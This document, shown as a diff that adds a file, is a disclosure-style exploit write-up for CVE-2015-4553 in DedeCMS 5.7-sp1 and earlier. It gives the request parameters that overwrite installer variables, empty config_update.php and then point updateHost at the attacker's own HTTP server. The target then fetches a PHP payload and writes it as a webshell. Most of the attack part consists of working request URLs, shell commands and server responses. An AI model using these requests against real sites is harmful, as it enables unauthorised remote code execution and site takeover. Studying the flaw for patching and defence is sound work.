@@ -1,0 +1,199 @@
+ ==========================
+# Exploit Title: Dedecms variable coverage leads to getshell
+# Date: 26-06-2015
+# Vendor Homepage: http://www.dedecms.com/]
+# Version: dedecms 5.7-sp1 and all old version
+# CVE : CVE-2015-4553
+===========================
+
+
+[CVE-2015-4553]Dedecms variable coverage leads to getshell
+#############################################################################
+#
+#   DBAPPSECURITY  LIMITED http://www.dbappsecurity.com.cn/
+#
+#############################################################################
+#
+# CVE ID:   CVE-2015-4553
+# Subject:   Dedecms variable coverage leads to getshell
+# Author:   zise
+# Date:     06.17.2015
+#############################################################################
+Introduction:
+========
+dedecms Open source cms
+Extensive application
+ 
+Influence version 
+Newest dedecms 5.7-sp1 and all old version
+
+
+Remote getshell 
+Details:
+=======
+After the default installation of dedecms
+Installation directory
+/install/index.php
+or
+/install/index.php.bak
+ 
+/install/index.php //run iis apache exploit
+/install/index.php.bak //run apache exploit
+
+
+Code analysis
+
+/install/index.php.bak?install_demo_name=aaaa&insLockfile=bbbb
+
+#############################################################################
+17 $install_demo_name = 'dedev57demo.txt';
+18 $insLockfile = dirname(__FILE__).'/install_lock.txt';
+
+here $install_demo_name and $insLockfile definition
+// echo $install_demo_name;  printf dedev57demo.txt 
+
+29 foreach(Array('_GET','_POST','_COOKIE') as $_request)
+30 {
+31    foreach($$_request as $_k => $_v) ${$_k} = RunMagicQuotes($_v);
+32 }
+
+
+// echo $install_demo_name; printf aaaa
+
+$install_demo_name by variable coverage
+
+The same
+17 $install_demo_name = 'dedev57demo.txt';
+18 $insLockfile = dirname(__FILE__).'/install_lock.txt';
+
+variable coverage
+#############################################################################
+
+
+
+ 
+GETSHELL Step 1 Clear file contents config_update.php
+#############################################################################
+config_update.php
+13 $updateHost = 'http://updatenew.dedecms.com/base-v57/';
+14 $linkHost = 'http://flink.dedecms.com/server_url.php';
+
+In order to obtain the webshell need to control $updateHost
+So the use of variable coverags cleared config_update.php
+
+ 
+http://192.168.204.135/install/index.php.bak
+?step=11
+&insLockfile=a
+&s_lang=a
+&install_demo_name=../data/admin/config_update.php
+
+index.php.bak
+373 else if($step==11)
+374 {
+375 require_once('../data/admin/config_update.php');
+376 $rmurl = $updateHost."dedecms/demodata.{$s_lang}.txt";
+377 
+378 $sql_content = file_get_contents($rmurl);
+379 $fp = fopen($install_demo_name,'w');
+380 if(fwrite($fp,$sql_content))
+381 echo '&nbsp; <font color="green">[√]</font> 存在(您可以选择安装进行体验)';
+382 else
+383 echo '&nbsp; <font color="red">[×]</font> 远程获取失败';
+384 unset($sql_content);
+385 fclose($fp);
+386 exit();
+387 }
+
+###
+HTTP/1.1 200 OK
+Date: Wed, 17 Jun 2015 06:55:23 GMT
+Server: Apache/2.4.12
+X-Powered-By: PHP/5.6.6
+Vary: User-Agent
+Content-Length: 55
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=utf-8
+ 
+  <font color="red">[×]</font> 远程获取失败
+ ###
+
+
+
+
+###After execution file 0 byte ~ho~year~####
+2015/06/17  14:55                 0 config_update.php
+               1 file              0 byte
+
+
+ 
+GETSHELL Step 2
+#############################################################################
+Create local HTTP services
+ 
+zise:tmp zise$ ifconfig en0
+en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
+inet 119.253.3.18 netmask 0xffffff00 broadcast  
+ 
+zise:tmp zise$ mkdir "dedecms"
+zise:tmp zise$ cd dedecms/
+zise:dedecms zise$ echo "<?php phpinfo();?>" > demodata.a.txt
+zise:dedecms zise$ cd ../
+zise:tmp zise$ python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+192.168.204.135 - - [17/Jun/2015 15:11:18] "GET /dedecms/demodata.a.txt HTTP/1.0" 200 -
+ 
+ 
+####
+http://192.168.204.135/install/index.php.bak
+?step=11
+&insLockfile=a
+&s_lang=a
+&install_demo_name=hello.php
+&updateHost=http://119.253.3.18:8000/
+
+####
+ 
+HTTP/1.1 200 OK
+Date: Wed, 17 Jun 2015 07:11:18 GMT
+Server: Apache/2.4.12
+X-Powered-By: PHP/5.6.6
+Vary: Accept-Encoding,User-Agent
+Content-Length: 81
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=utf-8
+ 
+  <font color="green">[√]</font> 存在(您可以选择安装进行体验)
+
+
+index.php.bak
+373 else if($step==11)
+374 {
+375 require_once('../data/admin/config_update.php');
+376 $rmurl = $updateHost."dedecms/demodata.{$s_lang}.txt";
+377 
+378 $sql_content = file_get_contents($rmurl);
+379 $fp = fopen($install_demo_name,'w');
+380 if(fwrite($fp,$sql_content))  //fwrite websehll
+381 echo '&nbsp; <font color="green">[√]</font> 存在(您可以选择安装进行体验)';
+382 else
+383 echo '&nbsp; <font color="red">[×]</font> 远程获取失败';
+384 unset($sql_content);
+385 fclose($fp);
+386 exit();
+387 }
+ 
+Attack complete
+you webshell
+ 
+http://192.168.204.135/install/hello.php
+
+
+
+> zise ^_^
+> Security researcher
+
+This is the vulnerability of some web pages
+http://seclists.org/fulldisclosure/2015/Jun/47 
